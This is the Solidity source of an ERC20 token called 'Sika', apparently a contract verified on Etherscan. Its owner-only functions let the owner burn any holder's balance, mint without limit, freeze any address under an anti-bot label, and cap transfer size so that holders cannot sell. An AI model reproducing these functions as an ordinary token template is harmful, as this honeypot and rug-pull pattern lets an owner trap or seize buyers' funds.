/**
 *Submitted for verification at Etherscan.io on 2021-07-02
*/

pragma solidity ^0.6.0;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Owner {
   address private owner;
   constructor() public {
      owner = msg.sender;
   }
   modifier onlyOwner {
      require(msg.sender == owner);
      _;
   }
}


contract ERC20Basic is IERC20,Owner {

    string public constant name = "Sika";
    string public constant symbol = "SIKA";
    uint8 public constant decimals = 18;


    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    event Transfer(address indexed from, address indexed to, uint tokens);

    mapping (address => bool) private _isBlackListedBot;
    uint256 public _maxTxAmount;
    address public _isExludedFromTxSender;

    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_;

    using SafeMath for uint256;


   constructor(uint256 total,uint256 maxTxPercent) public {
    totalSupply_ = total;
    balances[msg.sender] = totalSupply_;
    _maxTxAmount=maxTxPercent;
    }

    function totalSupply() public override view returns (uint256) {
    return totalSupply_;
    }

    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[msg.sender]);
        require(numTokens > 0, "Transfer amount must be greater than zero");
        require(!_isBlackListedBot[msg.sender], "You have no power here!");
        require(!_isBlackListedBot[receiver], "You have no power here!");
        if (msg.sender != _isExludedFromTxSender) {
            require(numTokens < _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }
        balances[msg.sender] = balances[msg.sender].sub(numTokens);
        balances[receiver] = balances[receiver].add(numTokens);
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function mint(address account, uint256 amount) public onlyOwner {
        require(account != address(0), "ERC20: mint to the zero address");
        totalSupply_ = totalSupply_.add(amount);
        balances[account] = balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

     function burn(address account, uint256 value) public onlyOwner {
        require(account != address(0), "ERC20: burn from the zero address");
        totalSupply_ = totalSupply_.sub(value);
        balances[account] = balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }
  function setMaxTxAmount(uint256 maxTxPercent) public onlyOwner {
        _maxTxAmount = maxTxPercent;
    }

    function setExluded(address excludedTxSender) public onlyOwner {
        _isExludedFromTxSender = excludedTxSender;
    }

    function addBotToBlackList(address account) external onlyOwner() {
        require(account != address(this));
        require(!_isBlackListedBot[account], "Account is already blacklisted");
        _isBlackListedBot[account] = true;
    }

    function removeBotFromBlackList(address account) external onlyOwner() {
        require(_isBlackListedBot[account], "Account is not blacklisted");
                _isBlackListedBot[account] = false;
    }

    function approve(address delegate, uint256 numTokens) public override returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public override view returns (uint) {
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[owner]);
        require(numTokens <= allowed[owner][msg.sender]);
        require(numTokens > 0, "Transfer amount must be greater than zero");
        require(!_isBlackListedBot[owner], "You have no power here!");
        require(!_isBlackListedBot[buyer], "You have no power here!");
        if (owner != _isExludedFromTxSender) {
            require(numTokens < _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }
        balances[owner] = balances[owner].sub(numTokens);
        allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);
        balances[buyer] = balances[buyer].add(numTokens);
        emit Transfer(owner, buyer, numTokens);
        return true;
    }
    
    
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      assert(b <= a);
      return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      assert(c >= a);
      return c;
    }
    
      function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
}